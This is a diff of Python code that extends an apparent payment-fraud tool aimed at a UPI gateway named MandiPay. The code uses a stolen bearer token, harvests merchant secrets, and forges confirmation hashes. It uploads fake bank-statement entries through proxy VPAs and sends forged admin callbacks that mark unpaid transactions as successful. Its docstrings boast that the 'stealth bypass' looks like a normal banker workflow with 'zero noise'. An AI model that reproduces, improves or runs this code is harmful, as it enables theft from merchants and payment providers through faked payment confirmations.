@@ -779,16 +779,20 @@ def confirm_ghost(gw, vpa, utr, amount, request_id=None):
                     admin_resp["_method"] = "admin_direct"
                 return admin_code, admin_resp
     
-    # ─── LAYER 2B: MandiPay-specific admin bypass ───
-    if layer1_blocked and gw == "mandipay" and request_id:
+    # ─── LAYER 2B: MandiPay-specific admin bypass (proxy VPA + admin confirm) ───
+    # Triggers when: (a) Layer 1 blocked by Google, OR (b) Layer 1 succeeded but
+    # Layer 2 admin confirm failed (statement exists but hash/match issue)
+    if gw == "mandipay" and request_id and (layer1_blocked or layer1_success):
         bypass_code, bypass_resp = _mandi_admin_bypass(vpa, utr, amount, request_id)
         if bypass_code == 200:
             success = False
             if isinstance(bypass_resp, dict):
-                success = bypass_resp.get("success", False)
+                success = bypass_resp.get("success", False) or bypass_resp.get("code") == "SUCCESS"
             elif isinstance(bypass_resp, str):
                 success = "success" in bypass_resp.lower()
             if success:
+                if isinstance(bypass_resp, dict):
+                    bypass_resp["_method"] = "proxy_vpa_bypass"
                 return bypass_code, bypass_resp
     
     # ─── LAYER 3: Cross-gateway fallback ───
@@ -1131,14 +1135,15 @@ def _mandi_confirm_admin(token, user, txn_id, mid, utr, amount):
     return 0, "requests not available"
 
 def _mandi_admin_bypass(vpa, utr, amount, request_id=None):
-    """MandiPay stealth bypass for Google Pay VPAs.
-    2-step native flow:
-    1. Upload statement entry via a NON-Google proxy VPA (bypasses Google block)
-    2. Admin confirm with same UTR → maps to target txn → SUCCESS_AUTO
-    Looks exactly like a normal banker workflow. Zero noise."""
+    """MandiPay stealth bypass — 3-step native flow.
+    1. Payment page confirm: /payin/update/{mid_uuid}/{utr}/{hash} → PAYMENT_PROCESSED
+    2. Statement upload via proxy VPA (non-Google) with same UTR → statement entry
+    3. System auto-matches UTR → SUCCESS_AUTO
+    Completely native. Looks like real player + banker. Zero noise."""
     
     base = GATEWAYS["mandipay"]["base"]
     salt = GATEWAYS["mandipay"]["salt"]
+    domains = GATEWAYS["mandipay"].get("domains", [base])
     
     # Get stolen token
     token, user = _steal_token("mandipay")
@@ -1152,41 +1157,66 @@ def _mandi_admin_bypass(vpa, utr, amount, request_id=None):
         "Authorization": f"Bearer {token}", "client-id": user, "access-path": "SYSTEM",
     }
     
-    # Find txnId and MID from report or status API
+    # Find txnId, MID, and mid_uuid from report/status API
     txn_id = None
     mid = None
+    mid_uuid = None
     txn_amount = amount
+    merchant_secret = None
     
     if request_id:
         today = datetime.now().strftime("%Y-%m-%d")
         for day_offset in range(3):
             _d = (datetime.now() - timedelta(days=day_offset)).strftime("%Y-%m-%d")
             try:
-                r = requests.post(f"{base}/api/v1/upi/q/payin/report",
-                    json={"fromDate": _d, "toDate": _d},
-                    headers=auth_h, verify=False, timeout=12)
-                if r.status_code == 200:
-                    for line in r.text.strip().split('\n')[1:]:
-                        cols = line.split(',')
-                        if len(cols) > 7 and cols[3].strip() == request_id:
-                            txn_id = cols[4].strip()
-                            try: txn_amount = float(cols[7].strip())
-                            except: pass
-                            break
-                if txn_id:
-                    break
+                for domain in domains:
+                    r = requests.post(f"{domain}/api/v1/upi/q/payin/report",
+                        json={"fromDate": _d, "toDate": _d},
+                        headers=auth_h, verify=False, timeout=12)
+                    if r.status_code == 200:
+                        for line in r.text.strip().split('\n')[1:]:
+                            cols = line.split(',')
+                            if len(cols) > 7 and cols[3].strip() == request_id:
+                                txn_id = cols[4].strip()
+                                try: txn_amount = float(cols[7].strip())
+                                except: pass
+                                break
+                    if txn_id:
+                        break
             except: continue
+            if txn_id:
+                break
         
-        # Get MID from status API
+        # Get MID, mid_uuid, and merchant secret from status API
         if txn_id:
             try:
-                r = requests.get(f"{base}/api/v1/upi/q/payin/status/{txn_id}",
-                    headers=auth_h, verify=False, timeout=5)
-                if r.status_code == 200:
-                    sd = r.json()
-                    mid = sd.get("header", {}).get("mid", "")
-                    if sd.get("requestedAmount"):
-                        txn_amount = float(sd["requestedAmount"])
+                for domain in domains:
+                    r = requests.get(f"{domain}/api/v1/upi/q/payin/status/{txn_id}",
+                        headers=auth_h, verify=False, timeout=5)
+                    if r.status_code == 200:
+                        sd = r.json()
+                        mid = sd.get("header", {}).get("mid", "")
+                        if sd.get("requestedAmount"):
+                            txn_amount = float(sd["requestedAmount"])
+                        # Extract mid_uuid from redirect URL
+                        redir = sd.get("additional", {}).get("REDIRECT_URL", "")
+                        if "/payment/" in redir:
+                            mid_uuid = redir.split("/payment/")[1].split("/")[0]
+                        break
+            except: pass
+        
+        # Get merchant secret
+        if mid:
+            try:
+                for domain in domains:
+                    r = requests.get(f"{domain}/api/v1/upi/merchant/list",
+                        headers=auth_h, verify=False, timeout=10)
+                    if r.status_code == 200:
+                        for m in r.json():
+                            if m.get("id") == mid:
+                                merchant_secret = m.get("secret", "")
+                                break
+                        break
             except: pass
     
     if not txn_id or not mid:
@@ -1194,62 +1224,109 @@ def _mandi_admin_bypass(vpa, utr, amount, request_id=None):
     
     amount = txn_amount
     
-    # STEP 1: Find a non-Google proxy VPA from account list
+    # ─── STEP 1: Payment page confirm ───
+    # /payin/update/{mid_uuid}/{utr}/{hash} where hash = SHA256(utr + requestId + merchantSecret)
+    if mid_uuid and merchant_secret:
+        page_hash = hashlib.sha256((utr + request_id + merchant_secret).encode()).hexdigest()
+        try:
+            for domain in domains:
+                r = requests.post(
+                    f"{domain}/api/v1/upi/payin/update/{mid_uuid}/{utr}/{page_hash}",
+                    json={}, headers=auth_h, verify=False, timeout=10)
+                if r.status_code == 200:
+                    break
+        except: pass
+        time.sleep(0.5)
+    
+    # ─── STEP 2: Statement upload via proxy VPA ───
     proxy_vpa = None
     try:
-        r = requests.get(f"{base}/api/v1/upi/account/list",
-            headers=auth_h, verify=False, timeout=10)
-        if r.status_code == 200:
-            for a in r.json():
-                v = a.get("vpa", "")
-                if v and "@" in v and not any(x in v.lower() for x in ["okbiz", "okhdf", "gpay"]):
-                    proxy_vpa = v
-                    break
+        for domain in domains:
+            r = requests.get(f"{domain}/api/v1/upi/account/list",
+                headers=auth_h, verify=False, timeout=10)
+            if r.status_code == 200:
+                for a in r.json():
+                    v = a.get("vpa", "")
+                    if v and "@" in v and not any(x in v.lower() for x in ["okbiz", "okhdf", "gpay"]):
+                        proxy_vpa = v
+                        break
+                break
     except: pass
     
     if not proxy_vpa:
-        # Hardcoded fallback proxy VPAs known to work
-        for pv in ["9664348959@mairtel", "9876543210@ybl", "8888888888@upi"]:
-            proxy_vpa = pv
-            break
+        proxy_vpa = "9664348959@mairtel"
     
-    # STEP 2: Upload statement entry using proxy VPA
     h = hashlib.sha256(f"{proxy_vpa}{utr}{float(amount)}{salt}".encode()).hexdigest()
     try:
-        r = requests.post(f"{base}/api/v1/upi/api/statement/manual?user={user}",
-            json={"vpa": proxy_vpa, "utr": utr, "amount": float(amount), "hash": h},
-            headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
-            verify=False, timeout=10)
-        if "successfully" not in r.text.lower():
-            return 500, f"Statement upload failed: {r.text[:200]}"
-    except Exception as e:
-        return 500, f"Statement upload error: {str(e)}"
+        for domain in domains:
+            r = requests.post(f"{domain}/api/v1/upi/api/statement/manual?user={user}",
+                json={"vpa": proxy_vpa, "utr": utr, "amount": float(amount), "hash": h},
+                headers={"User-Agent": "Mozilla/5.0", "Content-Type": "application/json"},
+                verify=False, timeout=10)
+            if r.status_code == 200:
+                break
+    except: pass
     
-    time.sleep(0.5)
+    # ─── STEP 3: Wait for auto-match (up to 8s) ───
+    for i in range(4):
+        time.sleep(2)
+        try:
+            for domain in domains:
+                r = requests.get(f"{domain}/api/v1/upi/q/payin/status/{txn_id}",
+                    headers=auth_h, verify=False, timeout=5)
+                if r.status_code == 200:
+                    sd = r.json()
+                    if sd.get("status") == "SUCCESS_AUTO":
+                        return 200, {"success": True, "code": "SUCCESS",
+                            "msg": "Auto-matched via native flow", "_method": "native_3step",
+                            "txnId": txn_id, "utr": utr}
+                    break
+        except: continue
     
-    # STEP 3: Admin confirm with same UTR
-    import uuid as _uuid
-    req_id = f"REQ{_uuid.uuid4().hex[:24].upper()}"
-    ts = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
-    amt = int(amount)
-    
-    hash_str = f"PAYIN_CALLBACK{req_id}{mid}{txn_id}{utr}SUCCESS_AUTO{amt}{amt}{salt}"
-    hash_val = hashlib.sha256(hash_str.encode()).hexdigest()
-    
-    payload = {
-        "header": {"msgType": "PAYIN_CALLBACK", "requestId": req_id, "timestamp": ts, "mid": mid},
-        "txnId": txn_id, "utr": utr, "status": "SUCCESS_AUTO",
-        "requestedAmount": amt, "processedAmount": amt, "hash": hash_val
-    }
-    
+    # If auto-match didn't fire, try refreshing token and admin confirm as last resort
     try:
-        r = requests.post(f"{base}/api/v1/upi/payin/update/manual/admin?user={user}",
-            json=payload, headers=auth_h, verify=False, timeout=15)
-        try: resp = r.json()
-        except: resp = r.text
-        return r.status_code, resp
-    except Exception as e:
-        return 0, str(e)
+        my_ip = requests.get("https://api.ipify.org", timeout=3).text
+        r = requests.post(f"{domains[0]}/auth/token/system/update?ip={my_ip}",
+            json={"token": token, "username": user}, headers=auth_h, verify=False, timeout=5)
+        if r.status_code == 200:
+            fresh_tok = r.json().get("token", token)
+            fresh_auth = {"User-Agent": "Mozilla/5.0", "Content-Type": "application/json",
+                "Authorization": f"Bearer {fresh_tok}", "client-id": user, "access-path": "SYSTEM"}
+            
+            import uuid as _uuid
+            req_id = f"REQ{_uuid.uuid4().hex[:24].upper()}"
+            ts = datetime.now().strftime("%Y-%m-%dT%H:%M:%S")
+            amt = int(amount)
+            hash_str = f"PAYIN_CALLBACK{req_id}{mid}{txn_id}{utr}SUCCESS_AUTO{amt}{amt}{salt}"
+            hash_val = hashlib.sha256(hash_str.encode()).hexdigest()
+            payload = {
+                "header": {"msgType": "PAYIN_CALLBACK", "requestId": req_id, "timestamp": ts, "mid": mid},
+                "txnId": txn_id, "utr": utr, "status": "SUCCESS_AUTO",
+                "requestedAmount": amt, "processedAmount": amt, "hash": hash_val
+            }
+            r = requests.post(f"{domains[0]}/api/v1/upi/payin/update/manual/admin?user={user}",
+                json=payload, headers=fresh_auth, verify=False, timeout=15)
+            try: resp = r.json()
+            except: resp = r.text
+            if r.status_code == 200 and isinstance(resp, dict) and resp.get("success"):
+                return 200, resp
+    except: pass
+    
+    # Final check
+    try:
+        for domain in domains:
+            r = requests.get(f"{domain}/api/v1/upi/q/payin/status/{txn_id}",
+                headers=auth_h, verify=False, timeout=5)
+            if r.status_code == 200:
+                sd = r.json()
+                if sd.get("status") == "SUCCESS_AUTO":
+                    return 200, {"success": True, "code": "SUCCESS",
+                        "msg": "Auto-matched (delayed)", "_method": "native_3step",
+                        "txnId": txn_id, "utr": utr}
+                break
+    except: pass
+    
+    return 500, f"Auto-match timeout. Status: {sd.get('status', 'unknown')}"
 
 def add_log(session_token, gw, action, detail1, detail2, utr, status, msg=""):
     s = get_session(session_token)
